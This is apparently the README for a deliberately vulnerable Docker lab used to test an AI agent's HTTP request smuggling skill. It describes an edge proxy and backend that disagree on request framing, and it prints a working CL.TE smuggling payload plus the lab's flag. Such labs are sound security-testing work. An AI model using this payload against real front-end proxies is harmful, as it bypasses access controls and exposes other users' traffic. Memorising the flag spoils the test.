# HTTP Request Smuggling — Guinea Pig (end-to-end validation target)

A deliberately vulnerable **CL.TE** two-tier HTTP stack, used to validate the
RedAmon `http_request_smuggling` built-in agent skill end to end.

```
   client ──▶  EDGE proxy  ──(pooled keep-alive)──▶  BACKEND origin
              :9092 (8080)                            :9093 (5000)
              honors Content-Length                   honors Transfer-Encoding
              blocks /admin at the edge               serves /admin (the FLAG)
```

The edge and the backend **disagree on where a request ends**: the edge frames by
`Content-Length`, the backend frames by `Transfer-Encoding: chunked`. That is a
classic CL.TE desync. The edge blocks `/admin`, so the flag at the backend's
`/admin` is reachable **only** by smuggling a request past the edge.

## Endpoints

| URL | Result |
| --- | --- |
| `http://<edge>/` | 200 landing page (stamped `Via: 1.1 redamon-edge`) |
| `http://<edge>/admin` | **403** — blocked at the edge |
| `http://<backend-direct>/admin` | 200 + FLAG — proves a distinct backend serves it |

The intended path is entirely through the **edge** (`:9092`). The direct backend
port (`:9093`) exists only so recon can see that a distinct back-end app server
(`X-Backend-Server: orders-api`) sits behind the edge (`X-Edge-Proxy: redamon-edge`).

Flag: `REDAMON_HRS{cl_te_desync_reached_the_backend}`

## Run

```bash
docker compose up -d --build
open http://localhost:9092/          # edge landing
curl -s http://localhost:9092/admin  # 403 at the edge
python3 tests/verify_desync.py       # proves the CL.TE desync yields the flag
```

## Point RedAmon at it

The RedAmon agent runs in containers, so target the lab on the shared network by
name rather than `localhost`:

```bash
# attach the edge (and backend) to the RedAmon network
docker network connect redamon-network hrs-guinea-edge
docker network connect redamon-network hrs-guinea-backend
```

Then create a project with **target = `http://hrs-guinea-edge:8080`**. Enable the
**HTTP Request Smuggling / Desync** agent skill (it is OFF by default), open the
project chat, and ask the agent to test the edge for a request-smuggling desync.

Alternatively, from a `--net=host` context, target `http://172.80.0.1:9092` (the
host Docker-bridge gateway) or the host LAN IP.

## The exploit (CL.TE)

```
POST / HTTP/1.1
Host: x
Content-Length: 36
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: x
```

The edge reads `Content-Length` bytes (the whole body, including the smuggled
request) and forwards them as ONE request on its pooled upstream. The backend
reads the chunked body, ends it at the `0` chunk, and holds `GET /admin ...` as
the start of the NEXT request on that connection. A follow-up normal request then
completes the smuggled `/admin` request and its response (the flag) is returned to
the follow-up. Rule out pipelining by confirming the effect on a separate
connection — which is exactly what happens here (the follow-up is a fresh
connection sharing the edge's pooled upstream).

## Files

| File | Role |
| --- | --- |
| `frontend/proxy.py` | CL-based edge proxy; blocks `/admin`; pools one upstream |
| `backend/app.py` | TE-honoring origin; serves the flag at `/admin` |
| `docker-compose.yml` | edge `:9092`, direct backend `:9093` |
| `tests/verify_desync.py` | self-check: 403 at edge, flag via CL.TE smuggle |
